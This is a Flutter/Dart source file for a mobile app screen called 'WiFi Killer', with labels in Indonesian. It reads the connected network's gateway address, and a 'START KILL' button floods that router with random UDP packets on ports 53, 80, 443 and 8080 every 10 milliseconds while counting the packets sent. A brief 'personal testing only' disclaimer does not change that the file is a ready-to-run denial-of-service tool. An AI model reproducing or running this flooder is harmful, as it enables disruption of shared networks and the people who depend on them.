import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;
  int _packetCount = 0;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _loadWifiInfo();
  }

  Future<void> _requestPermissions() async {
    if (Platform.isAndroid) {
      final status = await Permission.location.request();
      if (!status.isGranted) {
        _showAlert("Permission Denied", "Izin lokasi diperlukan untuk membaca info WiFi.");
      }
    }
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name?.replaceAll('"', '') ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? _getDefaultGateway();
      });
    } catch (e) {
      setState(() {
        ssid = ip = routerIp = "Error";
      });
    }
  }

  String _getDefaultGateway() {
    if (ip.startsWith("192.168.1.")) return "192.168.1.1";
    if (ip.startsWith("192.168.0.")) return "192.168.0.1";
    if (ip.startsWith("10.0.0.")) return "10.0.0.1";
    return "192.168.1.1";
  }

  void _startFlood() async {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() {
      isKilling = true;
      _packetCount = 0;
    });
    
    _showAlert("✅ Started", "WiFi Killer dimulai ke router: $routerIp\n\nStop secara manual.");

    const targetPorts = [53, 80, 443, 8080];
    final List<int> payload = List<int>.generate(1472, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 10), (_) async {
      if (!mounted || !isKilling) return;

      try {
        final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
        
        // HAPUS baris yang error:
        // socket.setOption(SocketOption.broadcast, true);
        
        for (int p = 0; p < targetPorts.length; p++) {
          for (int j = 0; j < 10; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPorts[p]);
          }
        }
        
        socket.close();
        
        setState(() {
          _packetCount += targetPorts.length * 10;
        });
        
      } catch (e) {
        print("Flood error: $e");
      }
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.\nTotal packet dikirim: $_packetCount");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Text(title,
            style: TextStyle(color: Colors.yellow, fontSize: 18, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
        content: Text(message,
            style: TextStyle(color: Colors.white, fontSize: 14, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: Colors.yellow)),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: Colors.white70, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: TextStyle(color: Colors.white))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.yellow,
        title: const Text("📡 WiFi Killer", style: TextStyle(fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "⚡ WiFi Killer (Internal)",
              style: TextStyle(color: Colors.yellow, fontSize: 20, fontWeight: FontWeight.bold, fontFamily: 'Orbitron'),
            ),
            const SizedBox(height: 8),
            const Text(
              "⚠️ Feature ini dapat mematikan jaringan WiFi yang Anda sambung.\nGunakan hanya untuk testing pribadi.",
              style: TextStyle(color: Colors.white70, fontSize: 12),
            ),
            const SizedBox(height: 20),
            Container(
              width: double.infinity,
              decoration: BoxDecoration(
                color: Colors.black54,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.yellow.shade100),
              ),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("📶 SSID", ssid),
                  const Divider(color: Colors.white24),
                  _infoRow("🌐 IP Address", ip),
                  const Divider(color: Colors.white24),
                  _infoRow("🎯 Router IP", routerIp),
                  if (isKilling) ...[
                    const Divider(color: Colors.white24),
                    _infoRow("📦 Packet Sent", "$_packetCount"),
                  ],
                ],
              ),
            ),
            const SizedBox(height: 30),
            Center(
              child: ElevatedButton.icon(
                onPressed: isKilling ? _stopFlood : _startFlood,
                style: ElevatedButton.styleFrom(
                  backgroundColor: isKilling ? Colors.red : Colors.yellow,
                  foregroundColor: isKilling ? Colors.white : Colors.black,
                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(30)),
                ),
                icon: Icon(isKilling ? Icons.stop : Icons.wifi_off),
                label: Text(
                  isKilling ? "STOP KILL" : "START KILL",
                  style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, fontFamily: 'Orbitron'),
                ),
              ),
            ),
            if (isKilling)
              Padding(
                padding: const EdgeInsets.only(top: 20),
                child: Center(
                  child: Column(
                    children: [
                      const CircularProgressIndicator(color: Colors.yellow),
                      const SizedBox(height: 10),
                      Text(
                        "Flooding $_packetCount packets...",
                        style: TextStyle(color: Colors.white54, fontSize: 12),
                      ),
                    ],
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}